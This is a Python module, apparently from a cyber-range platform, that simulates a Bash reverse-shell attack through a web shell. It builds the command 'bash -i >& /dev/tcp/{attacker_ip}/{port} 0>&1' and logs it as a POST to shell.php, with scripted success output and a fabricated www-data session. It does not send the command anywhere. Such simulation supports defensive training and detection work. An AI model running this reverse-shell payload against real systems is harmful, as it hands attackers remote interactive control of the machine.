"""ATT-011: 反弹Shell - Bash"""
import time

SCRIPT_META = {
    "id": "ATT-011", "name": "反弹Shell-Bash", "version": "1.0.0",
    "category": "system_vuln", "mitre_tactic": "TA0002", "severity": "critical",
    "target_node_types": ["web-server", "app-server", "server"],
    "blockable_by": ["firewall-brain", "edr-server"],
    "traffic_pattern": {"protocols": ["tcp"], "port": [4444, 5555], "frequency": "low", "payload_size": "< 500B"},
    "impact": {"type": "unauthorized_access", "description": "建立远程C2通道获取交互式Shell", "visual_effect": "终端界面弹出 + 命令输入光标闪烁"},
    "tools": ["bash"], "customizable": True,
    "custom_params": [
        {"name": "attacker_ip", "type": "string", "default": "172.20.0.99"},
        {"name": "attacker_port", "type": "number", "default": 4444},
    ],
}

def run(target_url: str, params: dict, context: dict) -> dict:
    result = {"script_id": "ATT-011", "status": "running", "logs": [], "evidence": [], "traffic_generated": []}
    attacker_ip = params.get("attacker_ip", "172.20.0.99")
    attacker_port = params.get("attacker_port", 4444)
    result["logs"].append(f"[*] 利用 WebShell 执行反弹Shell命令")
    payload = f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1"
    result["logs"].append(f"[*] Payload: {payload[:50]}...")
    time.sleep(0.3)
    result["traffic_generated"].append({"method": "POST", "url": f"{target_url}/shell.php?cmd=", "payload": payload, "size": len(payload), "is_attack": True})
    time.sleep(0.3)
    result["logs"].append(f"[+] 反弹Shell成功!")
    result["logs"].append(f"[+] C2连接建立: {attacker_ip}:{attacker_port}")
    result["logs"].append(f"[+] 获得交互式Shell (uid=33 www-data)")
    result["evidence"].append({"type": "terminal", "data": f"$ whoami\nwww-data\n$ id\nuid=33(www-data) gid=33(www-data)", "description": "反弹Shell会话"})
    result["status"] = "success"
    return result
